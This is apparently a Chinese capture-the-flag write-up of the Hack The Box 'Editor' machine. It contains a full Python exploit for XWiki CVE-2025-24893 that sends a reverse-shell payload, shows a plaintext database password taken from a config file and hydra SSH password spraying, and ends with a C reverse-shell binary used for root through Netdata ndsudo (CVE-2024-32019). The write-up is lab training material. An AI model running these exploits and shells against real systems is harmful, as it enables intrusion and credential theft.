## nmap

起手固定操作。

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -sC -sV -Pn -T4 10.10.11.80                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-06 06:08 EDT
Nmap scan report for 10.10.11.80
Host is up (1.0s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 404.50 seconds
```

开放端口：22、80、8080

把IP和域名写入`/etc/hosts`

发现俩网站，一个编辑器的看起来高大上，另一个8080：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/1267788e6e69437983c7aa75cabe0810.png)

## CVE-2025-24893

[CVE-2025-24893｜XWiki Platform远程代码执行漏洞（POC）](https://cloud.tencent.com/developer/article/2549765)
[Exploit直接用-github](https://github.com/hackersonsteroids/cve-2025-24893)

---

### **源代码分析**

1. **漏洞位置**  
   XWiki 的 `SolrSearchMacros.xml` 中，处理 `text` 参数的代码片段：
   
   ```xml
   <velocity>
     #set($query = $request.getParameter("text"))
     #evaluate($query)
   </velocity>
   ```
   
   `#evaluate` 函数直接执行未过滤的用户输入，导致代码注入。

2. **补丁对比**  
   修复后版本（如 15.10.11）增加了输入过滤和沙箱机制：
   
   ```xml
   <velocity>
     #set($query = $escapetool.sql($request.getParameter("text")))
     #evaluate($query)
   </velocity>
   ```
   
   使用 `$escapetool.sql` 对 `text` 进行转义，并限制 Groovy 执行权限。

---

exploit：

```python
#!/usr/bin/env python3
# 指定使用Python 3解释器执行脚本

import argparse  # 用于解析命令行参数
import requests  # 发送HTTP请求
import urllib.parse  # URL编码处理
import sys  # 系统相关操作，如退出程序

# 显示工具横幅信息
def display_banner():
    print("="*80)
    print("Exploit Title : CVE-2025-24893 - XWiki Platform Remote Code Execution")
    print("Original By   : Al Baradi Joy")
    print("Modified By   : hackersOnSteroids.org Team Crew")
    print("="*80)

# 检测目标域名支持的协议（HTTP/HTTPS）
def detect_protocol(domain):
    for proto in ("https", "http"):  # 优先尝试HTTPS
        url = f"{proto}://{domain}"
        try:
            # 发送GET请求，允许重定向，超时5秒
            r = requests.get(url, timeout=5, allow_redirects=True)
            if r.status_code < 400:  # 状态码小于400视为成功
                print(f"[✔] {proto.upper()} OK: {url}")
                return url  # 返回可用的URL
        except requests.exceptions.RequestException:  # 请求异常处理
            pass
    print("[✖] Neither HTTP nor HTTPS is reachable.")
    sys.exit(1)  # 协议均不可用时退出

# 生成反向Shell的Python命令
def build_payload(lhost, lport):
    return (
        "python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"  # 连接监听地址
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"  # 重定向标准流
        "subprocess.call([\"/bin/sh\",\"-i\"])'"  # 启动交互式Shell
    )

# 执行漏洞利用的核心函数
def exploit(domain, lhost, lport):
    base = detect_protocol(domain)  # 获取目标基础URL
    cmd = build_payload(lhost, lport)  # 生成反向Shell命令

    # 转义单引号，确保Groovy字符串语法正确
    cmd_esc = cmd.replace("'", "\\'")

    # 构造Groovy代码，使用ProcessBuilder执行命令
    groovy = (
        "new ProcessBuilder(['/bin/bash','-c','"
        + cmd_esc +
        "']).redirectErrorStream(true).start()"
    )

    # 嵌入XWiki模板的Groovy宏
    macro = (
        "}}}"  # 闭合可能存在的原有标签
        "{{async async=false}}"  # 异步渲染宏，设为false立即执行
        "{{groovy}}" + groovy + "{{/groovy}}"  # 插入恶意Groovy代码
        "{{/async}}"
    )

    # URL编码处理，保留安全字符
    payload = urllib.parse.quote(macro, safe='')
    # 构造漏洞利用URL
    exploit_url = f"{base}/xwiki/bin/get/Main/SolrSearch?media=rss&text={payload}"

    print(f"[+] Sending exploit to:\n    {exploit_url}\n")
    try:
        # 发送GET请求触发漏洞
        r = requests.get(exploit_url, timeout=10)
        print(f"[+] HTTP {r.status_code}; now check your listener.")
    except Exception as e:
        print(f"[✖] Request failed: {e}")

# 命令行参数处理
def main():
    p = argparse.ArgumentParser(
        description="CVE-2025-24893 XWiki RCE w/ configurable reverse shell"
    )
    p.add_argument("domain", help="Target, e.g. wiki.example.local")
    p.add_argument("lhost",  help="Your listener IP")
    p.add_argument("lport",  help="Your listener port", type=int)
    args = p.parse_args()  # 解析参数

    display_banner()
    exploit(args.domain, args.lhost, args.lport)  # 执行漏洞利用

if __name__ == "__main__":
    main()
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/cve-2025-24893]
└─# python ./exploit.py 10.10.11.80:8080 10.10.16.21 4444
================================================================================
Exploit Title : CVE-2025-24893 - XWiki Platform Remote Code Execution
Original By   : Al Baradi Joy
Modified By   : hackersOnSteroids.org Team Crew
================================================================================
[✔] HTTP OK: http://10.10.11.80:8080
[+] Sending exploit to:
    http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dnew%20ProcessBuilder%28%5B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27python3%20-c%20%5C%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.10.16.21%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%5C%27%27%5D%29.redirectErrorStream%28true%29.start%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D

[+] HTTP 200; now check your listener.
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/7f0af63da1734a43a3fe17a0e6818e4b.png)

## xwiki

查用户

```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false
tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin
xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin
netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
_laurel:x:995:995::/var/log/laurel:/bin/false
```

定位可能存储数据库配置的目录

```bash
$ find /var/lib/xwiki/ /etc/xwiki/ /opt/xwiki/ -name "*config*" -o -name "*.properties" -o -name "*.xml" 2>/dev/null
/var/lib/xwiki/data/configuration.properties
/var/lib/xwiki/data/store/file/xwiki/b/f/8fb536bfe96480556241885cb20974/attachments/e/6/d4cbb35779b27121c39efde2a23520/~METADATA.xml
/var/lib/xwiki/data/store/solr/events_9/conf/solrconfig.xml
/var/lib/xwiki/data/store/solr/events_9/core.properties
/var/lib/xwiki/data/store/solr/extension_index_9/conf/solrconfig.xml
/var/lib/xwiki/data/store/solr/extension_index_9/core.properties
/var/lib/xwiki/data/store/solr/solr.xml
/var/lib/xwiki/data/store/solr/events/conf/solrconfig.xml
/var/lib/xwiki/data/store/solr/events/core.properties
/var/lib/xwiki/data/store/solr/search/META-INF/maven/org.xwiki.platform/xwiki-platform-search-solr-server-core/pom.xml
/var/lib/xwiki/data/store/solr/search/META-INF/maven/org.xwiki.platform/xwiki-platform-search-solr-server-core/pom.properties
/var/lib/xwiki/data/store/solr/search/conf/elevate.xml
/var/lib/xwiki/data/store/solr/search/conf/currency.xml
/var/lib/xwiki/data/store/solr/search/conf/solrconfig.xml
/var/lib/xwiki/data/store/solr/search/core.properties
/var/lib/xwiki/data/store/solr/search_9/conf/managed-schema.xml
/var/lib/xwiki/data/store/solr/search_9/conf/solrconfig.xml
/var/lib/xwiki/data/store/solr/search_9/core.properties
/var/lib/xwiki/data/store/solr/extension_index/conf/solrconfig.xml
/var/lib/xwiki/data/store/solr/extension_index/core.properties
/var/lib/xwiki/data/extension/history/2025.06.13.xml
/var/lib/xwiki/data/jobs/status/store.properties
/var/lib/xwiki/data/jobs/status/3/distribution/log.xml
/var/lib/xwiki/data/jobs/status/3/solr/indexer/log.xml
/var/lib/xwiki/data/jobs/status/extension/index/log.xml
/var/lib/xwiki/data/jobs/status/solr/indexer/log.xml
/var/lib/xwiki/tmp/start_1826614924204897555.properties
/etc/xwiki/portlet.xml
/etc/xwiki/jetty-web.xml
/etc/xwiki/jetty-ee8-web.xml
/etc/xwiki/cache/infinispan/config.xml
/etc/xwiki/hibernate.cfg.xml
/etc/xwiki/xwiki.properties
/etc/xwiki/sun-web.xml
/etc/xwiki/web.xml
/etc/xwiki/jboss-deployment-structure.xml
/etc/xwiki/xwiki-tomcat9.xml
/etc/xwiki/version.properties
/etc/xwiki/logback.xml
```

重点：

```bash
$ cat /etc/xwiki/xwiki.cfg | grep 'password\|jdbc'
# xwiki.superadminpassword=system
$ cat /etc/xwiki/hibernate.cfg.xml | grep 'password'
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/713d779282fe451d8fa91fc07ce8e77f.png)

## hydra密码喷洒

```bash
hydra -L user.txt -P passwd.txt ssh://10.10.11.80 -s 22 -t 4 -vV -f 
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/2cc0b8da7f21454f9b04fce1984f6ce5.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/4e74b2f4d2834469951ad0be094d8bb4.png)
拿到user的flag

## 权限提升：CVE-2024-32019

用户组查询

```bash
oliver@editor:~$ pwd
/home/oliver
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
oliver@editor:~$ groups
oliver netdata
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a02b740a74db46158c6d13b9ef4d5897.png)
SUID 权限配置错误或路径注入漏洞，允许普通用户通过 ndsudo 执行任意命令（如反向 Shell）获取 root 权限。
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/46b347b0f10546048a8956b7cad9b69d.png)

[Privilege Escalation via ndsudo (Netdata Local Exploit) - github](https://github.com/AzureADTrent/CVE-2024-32019-POC)

查找当前用户可写目录：

```bash
oliver@editor:~$ find / -type d -writable -exec ls -ld {} \; 2>/dev/null | grep -vE "/proc/|/sys/"
drwx------ 4 oliver oliver 120 Aug  6 14:50 /run/user/1000
drwx------ 2 oliver oliver 140 Aug  6 14:50 /run/user/1000/gnupg
drwxr-xr-x 4 oliver oliver 120 Aug  6 14:50 /run/user/1000/systemd
drwxr-xr-x 2 oliver oliver 80 Aug  6 14:58 /run/user/1000/systemd/units
drwxr-xr-x 3 oliver oliver 140 Aug  6 14:50 /run/user/1000/systemd/inaccessible
drwxrwxrwt 2 root utmp 40 Aug  6 14:48 /run/screen
drwxrwxrwt 4 root root 80 Aug  6 14:48 /run/lock
drwxr-x--- 4 oliver oliver 4096 Aug  6 14:58 /home/oliver
drwx------ 3 oliver oliver 4096 Aug  6 14:58 /home/oliver/.gnupg
drwx------ 2 oliver oliver 4096 Aug  6 14:58 /home/oliver/.gnupg/private-keys-v1.d
drwx------ 2 oliver oliver 4096 Jul  8 08:34 /home/oliver/.cache
drwxrwxrwt 7 root root 4096 Aug  6 14:48 /var/tmp
drwxrwxrwt 2 root root 4096 Jul 29 11:46 /var/crash
drwxrwxrwt 9 root root 4096 Aug  6 15:00 /tmp
drwx------ 2 oliver oliver 4096 Aug  6 14:58 /tmp/tmux-1000
drwxrwx--- 2 netdata netdata 4096 Aug  6 14:48 /opt/netdata/var/cache/netdata/dbengine
drwxrwx--- 2 netdata netdata 4096 Jul  8 08:34 /opt/netdata/var/cache/netdata/dbengine-tier2
drwxrwx--- 2 netdata netdata 4096 Aug  6 14:48 /opt/netdata/var/cache/netdata/dbengine-tier1
drwxrwxr-x 2 netdata netdata 4096 Jul  8 08:34 /opt/netdata/var/lib/netdata/cloud.d
drwxrwxrwt 2 root root 40 Aug  6 14:48 /dev/mqueue
drwxrwxrwt 2 root root 80 Aug  6 15:30 /dev/shm
```

这里的poc.c：

```c
#include <stdio.h>
#include <sys/socket.h>   // 网络套接字操作
#include <sys/types.h>    // 系统数据类型定义
#include <stdlib.h>       // 标准库函数（如 exit）
#include <unistd.h>       // 进程控制（如 setuid, dup2）
#include <netinet/in.h>   // IPv4/IPv6 地址结构定义
#include <arpa/inet.h>    // IP 地址转换函数

int main(void){
    // 提权操作：尝试将进程 UID/GID 设置为 root（0）
    setuid(0);  // 关键漏洞利用点：依赖 SUID 程序（如 ndsudo）执行此代码
    setgid(0);  // 确保组权限也提升到 root

    // 配置反向 Shell 参数
    int port = 9001;  // 攻击者监听端口
    struct sockaddr_in revsockaddr;

    // 创建 TCP 套接字
    int sockt = socket(AF_INET, SOCK_STREAM, 0);

    // 设置目标地址（攻击者 IP 和端口）
    revsockaddr.sin_family = AF_INET;        // IPv4 协议
    revsockaddr.sin_port = htons(port);      // 端口转换为网络字节序
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.16.X");  // 攻击者 IP监听地址

    // 连接到攻击者机器
    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));

    // 将标准输入/输出/错误重定向到套接字
    dup2(sockt, 0);  // stdin
    dup2(sockt, 1);  // stdout
    dup2(sockt, 2);  // stderr

    // 启动交互式 bash shell（输入/输出通过套接字传输）
    char * const argv[] = {"bash", NULL};
    execvp("bash", argv);  // 启动 shell

    return 0;       
}
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/ddceb4af0c2f4fd79faf5d5e31d60f7c.png)
把文件传上去：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/b60ce6bb6ee847ab8ed2f48a35d924cf.png)
把nvme1改为nvme
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/2c3482f82f034978bf70571f9cd2c7a1.png)

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e96464b5eeba4b09badb49219f5cea36.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/7fa57427bdf343d29ab0a6908f44846d.png)
